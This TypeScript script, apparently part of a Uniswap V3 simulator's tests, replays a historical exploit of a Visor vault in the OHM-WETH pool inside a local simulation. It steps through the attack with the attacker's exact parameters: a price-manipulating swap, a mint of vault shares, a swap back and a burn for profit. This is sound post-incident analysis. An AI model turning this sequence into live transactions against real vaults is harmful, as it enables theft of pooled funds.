import { loadConfig } from "../../src/config/TunerConfig";
import { BigNumber, providers, utils } from "ethers";
import { Visor__factory as VisorFactory } from "../../src/typechain/factories/Visor__factory";
import { OHM__factory as OHMFactory } from "../../src/typechain/factories/OHM__factory";
import { UniswapV3Pool2__factory as UniswapV3PoolFactory } from "../../src/typechain/factories/UniswapV3Pool2__factory";
import {
  MainnetDataDownloader,
  SimulatorClient,
  SimulationDataManager,
  SQLiteSimulationDataManager,
  isExist,
  toJSBI,
  toBN,
  mul10pow,
} from "../../src";
import JSBI from "jsbi";
import { VisorVault, buildVisorVault } from "./VisorVault";

// Test Visor Exploit
async function main() {
  const poolName = "verify";
  const poolAddress = "0xF1B63cD9d80f922514c04b0fD0a30373316dd75b";
  const visorAddress = "0x65Bc5c6A2630a87C2B494f36148E338dD76C054F";
  const OHMAddress = "0x383518188C0C6d7730D91b2c03a03C837814a899";
  const WETHAddress = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
  const blockNumBeforeAttack = 13683699;
  const tunerConfig = loadConfig(undefined);
  const RPCProviderUrl = tunerConfig.RPCProviderUrl;

  // "download events"
  if (!isExist(`${poolName}_${poolAddress}.db`)) {
    let mainnetDataDownloader = new MainnetDataDownloader(RPCProviderUrl);
    await mainnetDataDownloader.download(
      poolName,
      poolAddress,
      blockNumBeforeAttack + 1000
    );
  }

  // "verify attack situation"
  // These two values are properly calculated based on core pool sqrtPrice by attacker
  const token1ToManipulatePrice = BigNumber.from("615000000000000000000");
  const sqrtPriceLimitToManipulatePrice = BigNumber.from(
    "10292161094519309194920528426351142"
  );
  // Values to exploit Visor vault
  const mintToken0OnVisor = mul10pow(BigNumber.from(10), 9);
  const mintToken1OnVisor = mul10pow(BigNumber.from(0), 18);
  // These values are set by swap result above
  const token0ToSwapBack = BigNumber.from("2734185932930");
  const sqrtPriceLimitToSwapBack = BigNumber.from("4295128740");

  // setup simulator
  let simulationDataManager: SimulationDataManager =
    await SQLiteSimulationDataManager.buildInstance("./test/database.db");

  let clientInstance = new SimulatorClient(simulationDataManager);
  // replay to block height we want and take a snapshot when first run
  // let configurableCorePool =
  //   await clientInstance.recoverFromMainnetEventDBFile(
  //     `${poolName}_${poolAddress}.db`,
  //     blockNum,
  //     RPCProviderUrl
  //   );
  // configurableCorePool.takeSnapshot("test exploit on block 13683700");
  // await configurableCorePool.persistSnapshot();

  // recover corepool by snapshotId, replace it if you don't need demo db.
  let configurableCorePool = await clientInstance.recoverCorePoolFromSnapshot(
    "93590d83-ae2b-45d9-8e2e-c7184f4b1606"
  );

  // query Visor vault state at first run

  // let RPCProvider = new providers.JsonRpcProvider(RPCProviderUrl);
  // let visor = VisorFactory.connect(visorAddress, RPCProvider);
  // query visor state before the attack
  // let totalSupply = await visor.totalSupply({
  //   blockTag: blockNum,
  // });
  // console.log(totalSupply.toString());

  // let { total0, total1 } = await visor.getTotalAmounts({
  //   blockTag: blockNum,
  // });
  // console.log(total0.toString());
  // console.log(total1.toString());

  // let baseLower = await visor.baseLower({
  //   blockTag: blockNum,
  // });
  // let baseUpper = await visor.baseUpper({
  //   blockTag: blockNum,
  // });
  // let { liquidity: baseLiquidity } = await visor.getBasePosition({
  //   blockTag: blockNum,
  // });
  // console.log(baseLower.toString());
  // console.log(baseUpper.toString());
  // console.log(baseLiquidity.toString());
  // let limitLower = await visor.limitLower({
  //   blockTag: blockNum,
  // });
  // let limitUpper = await visor.limitUpper({
  //   blockTag: blockNum,
  // });
  // let { liquidity: limitLiquidity } = await visor.getLimitPosition({
  //   blockTag: blockNum,
  // });
  // console.log(limitLower.toString());
  // console.log(limitUpper.toString());
  // console.log(limitLiquidity.toString());
  // let ohm = OHMFactory.connect(OHMAddress, RPCProvider);
  // let balance0 = await ohm.balanceOf(visorAddress, {
  //   blockTag: blockNum,
  // });
  // let weth = OHMFactory.connect(WETHAddress, RPCProvider);
  // let balance1 = await weth.balanceOf(visorAddress, {
  //   blockTag: blockNum,
  // });
  // console.log(balance0.toString());
  // console.log(balance1.toString());
  // let positionKey = utils.solidityKeccak256(
  //   ["address", "int24", "int24"],
  //   [visorAddress, baseLower, baseUpper]
  // );
  // let pool = UniswapV3PoolFactory.connect(poolAddress, RPCProvider);
  // let position = await pool.positions(positionKey, {
  //   blockTag: blockNum,
  // });
  // console.log(position.tokensOwed0.toString());
  // console.log(position.tokensOwed1.toString());
  // let tokensOwed0OnBasePosition = position.tokensOwed0;
  // let tokensOwed1OnBasePosition = position.tokensOwed1;

  let [tokensOwed0OnBasePosition, tokensOwed1OnBasePosition] = [
    BigNumber.from("131600891"),
    BigNumber.from("573303410332369"),
  ];

  // build visor vault instance
  let vaultState = {
    baseLower: 190200,
    baseUpper: 194400,
    limitLower: 190200,
    limitUpper: 190600,
    balance0: BigNumber.from(0),
    balance1: BigNumber.from("2000000000000000036"),
    totalSupply: BigNumber.from("116165947632715658875"),
  };
  let visorVault: VisorVault = await buildVisorVault(
    configurableCorePool,
    visorAddress,
    vaultState
  );

  // If you want to change the position before attack like doing rebalance, implement it in VisorVault and call that here.
  // Rebalance should be a series of burn, collect and mint with configurableCorePool.
  // Don't forget to take care of balance manually after collecting tokensOwed from position.

  console.log("-------------------------------------");
  console.log(`blockNum #${blockNumBeforeAttack + 1}\n`);

  let sqrtPrice = toBN(configurableCorePool.getCorePool().sqrtPriceX96);
  console.log(`SqrtPrice in OHM-WETH 1% pool: ${sqrtPrice.toString()}.\n`);

  // sync collectable amounts of position because we don't replay Collect events for now
  let positionOnSimulator = configurableCorePool
    .getCorePool()
    .getPosition(
      visorAddress,
      visorVault.state.baseLower,
      visorVault.state.baseUpper
    );
  await configurableCorePool.collect(
    visorAddress,
    visorVault.state.baseLower,
    visorVault.state.baseUpper,
    JSBI.subtract(
      positionOnSimulator.tokensOwed0,
      toJSBI(tokensOwed0OnBasePosition)
    ),
    JSBI.subtract(
      positionOnSimulator.tokensOwed1,
      toJSBI(tokensOwed1OnBasePosition)
    )
  );

  // price manipulation
  let { amount0: swapAmount0, amount1: swapAmount1 } =
    await configurableCorePool.swap(
      false,
      toJSBI(token1ToManipulatePrice),
      toJSBI(sqrtPriceLimitToManipulatePrice)
    );
  console.log(
    `${toBN(swapAmount1).abs()} WETH were swapped for ${toBN(
      swapAmount0
    ).abs()} OHM.\n`
  );
  sqrtPrice = toBN(configurableCorePool.getCorePool().sqrtPriceX96);
  console.log(`SqrtPrice in OHM-WETH 1% pool: ${sqrtPrice.toString()}.\n`);

  // mint LP on visor
  let shares = await visorVault.mint(mintToken0OnVisor, mintToken1OnVisor);
  console.log(
    `${shares.toString()} LP tokens were minted from ${mintToken0OnVisor} OHM and ${mintToken1OnVisor} WETH.\n`
  );

  // swap back to restore current price
  ({ amount0: swapAmount0, amount1: swapAmount1 } =
    await configurableCorePool.swap(
      true,
      toJSBI(token0ToSwapBack),
      toJSBI(sqrtPriceLimitToSwapBack)
    ));
  console.log(
    `${toBN(swapAmount0).abs()} OHM were swapped back for ${toBN(
      swapAmount1
    ).abs()} WETH.\n`
  );
  sqrtPrice = toBN(configurableCorePool.getCorePool().sqrtPriceX96);
  console.log(`SqrtPrice in OHM-WETH 1% pool: ${sqrtPrice.toString()}.\n`);

  // burn LP on visor
  let { amount0, amount1 } = await visorVault.burn(shares);

  console.log(
    `${shares} LP tokens burned for ${amount0.toString()} OHM, ${amount1.toString()} WETH.\n`
  );
  console.log("-------------------------------------");

  await clientInstance.shutdown();
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
